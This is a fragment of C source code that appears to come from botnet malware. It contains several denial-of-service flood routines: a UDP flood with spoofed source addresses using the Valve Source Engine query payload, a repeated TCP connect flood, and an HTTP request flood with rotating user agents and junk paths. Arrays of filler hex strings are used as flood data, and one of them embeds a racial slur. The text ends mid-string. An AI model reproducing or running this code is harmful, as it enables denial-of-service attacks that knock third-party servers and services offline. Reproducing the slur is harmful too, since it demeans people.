        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA"
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        "9u123448u124au814d4x10",
        "cyppsxe20t3pu2m8bl88qsyd6uhhl22onwrjn76gs9tad69ms27q7a5knzmcfaj489791cmdwjfveeij9efmoieks6ob1t8eviul7z6fuhq1nkr6jn4piqisqxmabl4ocu2pjpprkjm7bfjh3ts1ul",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "yfj82z4ou6nd3pig3borbrrqhcve6n56xyjzq68o7yd1axh4r0gtpgyy9fj36nc2w",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        "01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
        "7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdedsecrunsyoulilassniggaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        };
        if (a >= 50)
        {
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
rand_init();
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findRandIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}
void acnc(unsigned char *ip,int port, int end_time)
{
    int end = time(NULL) + end_time;
    int sockfd;
    struct sockaddr_in server;
    //sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    
    while(end > time(NULL))
    {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        connect(sockfd , (struct sockaddr *)&server , sizeof(server));
        sleep(1);
        close(sockfd);
    }
    
}
int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

void httphex(char *host, in_port_t port, int timeEnd, int power, char *method)
{
    int httpvecint;
    srand(time(NULL));
    httpvecint = rand() % 100;
    int socket, socket2, i, end = time(NULL) + timeEnd, sendIP = 0;
    char choosepath[1024];
    char request[512], buffer[1];
    const char *methods[] = {"GET", "HEAD", "POST"};
    const char *UserAgents[] = 
    {
        "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
        "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
    };
    
    if(httpvecint < 20) {
    sprintf(choosepath, "x2F/x2B/x32/x33/x3D/x2F/x3C/x7D/x70/x22/x3F/x28/x27/x20/x2E/x30/x74/x3F/x74/x23/x72/x70/x35/x33/x36/x26/x74/x2C/x31/x2D/x75/x2F/x2B/x21/x7D/x3D/x2B/x37/x33/x32/x70/x21/x36/x2B/x32/x2D/x3F/x3F/x2C/x71/x32/x36/x2B/x3F/x74/x30/x27/x34/x28/x26/x2B/x36/x21/x35/x36/x2B/x7D/x7D/x73/x72/x2B/x33/x24/x75/x26/x2F/x37/x22/x70/x24/x31/x36/x76/x72/x32/x35/x76/x70/x75/x35/x21/x20/x2A/x2C/x76/x20/x74/x21/x75/x2A/x28/x37/x33/x76/x34/x71/x2E/x77/x26/x72/x27/x2F/x2F/x30/x2B/x27/x74/x30/x3F/x26/x2B/x34/x29/x75/x2C/x23/x7C/x21/x77/x31/x29/x76/x21/x74/x23/x2F/x37/x20/x73/x3F/x30/x30/x2D/x3D/x29/x22/x26/x72/x31/x24/x45");
    }
        else if(20 < httpvecint < 40) {
    sprintf(choosepath, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    }
        else if(40 < httpvecint < 60) {
    sprintf(choosepath, "/x77/x35/x77/x75/x24/x20/x26/x75/x23/x28/x2A/x34/x2F/x27/x2B/x31/x2C/x2D/x37/x2A/x21/x76/x73/x35/x28/x22/x77/x34/x2E/x74/x77/x20/x73/x2F/x2A/x24/x75/x26/x28/x24/x32/x76/x3F/x72/x20/x29/x73/x26/x76/x74/x27/x37/x37/x36/x36/x37/x32/x71/x30/x29/x28/x2C/x22/x35/x3F/x37/x37/x3F/x76/x20/x31/x3D/x76/x32/x28/x27/x74/x3F/x23/x74/x75/x29/x30/x77/x77/x31/x71/x24/x29/x35/x28/x33/x3F/x26/x22/x2A/x27/x2F/x35/x22/x21/x24/x2F/x35/x2C/x33/x22/x7D/x27/x7C/x22/x75/x2F/x36/x26/x37/x77/x30/x2D/x76/x2F/x36/x2F/x36/x75/x2A/x22/x70/x74/x20/x2A/x27/x22/x70/x29/x3F/x23/x2E/x3F/x27/x2A/x72/x73/x7D/x28/x73/x7D/x2B/x29/x3C/x22/x2D/x74/x37/x2C/x22/x77/x23/x30/x2A/x33/x20/x71/x30/x23/x30/x21/x71/x75/x73/x74/x71/x36/x77/x36/x72/x2B/x21/x7D/x73/x2B/x3C/x34/x33/x33/x7C/x3C/x2D/x74/x75/x71/x3D/x20/x29/x3F/x22/x3C/x3D/x30/x71/x31/x33/x33/x20/x3D/x2C/x3D/x74/x74/x28/x32/x21/x24/x35/x21/x76/x2E/x21/x33/x73/x7D/x28/x71/x74/x70/x73/x2C/x29/x27/x24/x2C/x3D/x3C/x72/x71/x2E/x7C/x34/x32/x72/x22/x2B/x74/x22/x34/x2C/x29/x2D/x26/x74/x2D/x21/x30/x2D/x20/x23/x24/x33/x74/x71/x76/x36/x74/x31/x27/x2A/x36/x77/x7C/x24/x35/x31/x26/x27/x2F/x2B/x28/x26/x37/x3C/x7C/x2F/x2B/x74/x20/x3F/x7C/x34/x33/x30/x26/x30/x3D/x75/x3D/x72/x36/x33/x23/x2D/x2A/x3F/x77/x36/x2A/x7D/x21/x2C/x30/x2F/x73/x73/x27/x20/x34/x24/x26/x2C/x21/x75/x23/x75/x24/x21/x71/x7C/x36/x72/x36/x27/x3F/x31/x71/x27/x74/x2D/x2D/x36/x3D/x2B/x35/x27/x20/x20/x2A/x3D/x29/x22/x3C/x33/x37/x34/x27/x23/x75/x7D/x2A/x2F/x3D/x2F/x2A/x20/x2F/x23/x23/x70/x20/x77/x20/x2D/x20/x28/x22/x26/x72/x23/x2F/x3D/x2D/x74/x29/x36/x37/x37/x74/x75/x2F/x3C/x74/x32/x26/x30/x77/x76/x30/x2C/x27/x22/x33/x2D/x2C/x7C/x77/x28/x34/x27/x2A/x30/x32/x71/x3C/x2D/x21/x2B/x2B/x31/x76/x2E/x37/x28/x22/x77/x33/x20/x2A/x2D/x24/x7D/x27/x24/x31/x2B/x2F/x33/x2C/x7C/x23/x72/x21/x70/x31/x72/x29/x37/x36/x20/x23/x2B/x7C/x32/x29/x29/x29/x23/x73/x2C/x2D/x7D/x27/x32/x2C/x72/x32/x3F/x2C/x23/x2A/x26/x21/x71/x76/x3C/x71/x34/x76/x31/x34/x2A/x2A/x71/x2F/x76/x70/x2C/x2D/x2F/x24/x73/x24/x31/x73/x3C/x3D/x26/x3D/x28/x3F/x2B/x2F/x26/x3D/x76/x29/x76/x26/x21/x35/x24/x36/x26/x71/x36/x3F/x26/x7D/x34/x33/x33/x37/x27/x2C/x20/x20/x21/x74/x27/x7D/x20/x37/x75/x2C/x2B/x24/x71/x73/x2A/x71/x3D/x28/x30/x20/x70/x3D/x24/x2A/x70/x3D/x2F/x29/x22/x3D/x3F/x28/x20/x7C/x73/x70/x28/x27/x7C/x3D/x34/x34/x75/x26/x7D/x3D/x3F/x34/x2A/x20/x75/x27/x2B/x35/x35/x71/x2F/x31/x23/x71/x30/x26/x3D/x2C/x72/x2C/x32/x32/x23/x2F/x2B/x28/x76/x3D/x30/x36/x2D/x23/x75/x45");
    }
        else if(60 < httpvecint < 80) {
    sprintf(choosepath, "/x3F/x70/x70/x23/x23/x23/x7C/x72/x3C/x2E/x3D/x74/x2F/x35/x7C/x33/x22/x3C/x70/x70/x30/x3C/x2D/x24/x3D/x31/x27/x35/x73/x3C/x77/x2C/x33/x76/x3D/x36/x29/x77/x2B/x30/x34/x75/x75/x76/x3D/x20/x2D/x27/x7C/x76/x2C/x73/x21/x29/x2F/x34/x3C/x29/x2C/x31/x2D/x75/x7D/x27/x77/x71/x37/x77/x35/x33/x3F/x71/x29/x36/x70/x29/x31/x21/x2C/x73/x3F/x74/x3C/x2F/x35/x73/x31/x76/x77/x77/x28/x3C/x35/x75/x21/x30/x35/x2A/x20/x36/x23/x7D/x2F/x2B/x27/x73/x33/x3C/x72/x24/x26/x36/x3F/x2E/x29/x24/x24/x22/x2A/x73/x72/x70/x36/x72/x2E/x21/x22/x7C/x76/x30/x7C/x26/x31/x36/x23/x2F/x34/x7D/x2E/x30/x31/x24/x2E/x24/x24/x21/x2F/x37/x28/x37/x36/x28/x74/x29/x3D/x24/x2D/x76/x77/x20/x3C/x7C/x36/x20/x31/x29/x7C/x23/x3C/x75/x33/x32/x76/x70/x3D/x7C/x2B/x7C/x3F/x34/x33/x2F/x3C/x31/x71/x35/x74/x34/x22/x71/x2F/x28/x27/x3F/x77/x2F/x34/x7C/x26/x28/x26/x36/x31/x73/x33/x33/x2C/x7D/x2A/x21/x28/x23/x2E/x28/x37/x33/x76/x3D/x37/x2F/x31/x76/x77/x24/x2A/x21/x32/x27/x7C/x2E/x23/x3C/x3C/x35/x7D/x33/x29/x2C/x2F/x22/x21/x23/x70/x21/x75/x31/x2A/x37/x26/x2D/x7C/x2B/x3C/x7D/x31/x27/x31/x37/x27/x24/x21/x28/x32/x32/x74/x34/x2F/x71/x27/x2D/x76/x2D/x76/x28/x29/x74/x2F/x26/x3F/x29/x2A/x29/x7C/x23/x34/x75/x71/x28/x77/x2C/x2B/x72/x7D/x2B/x3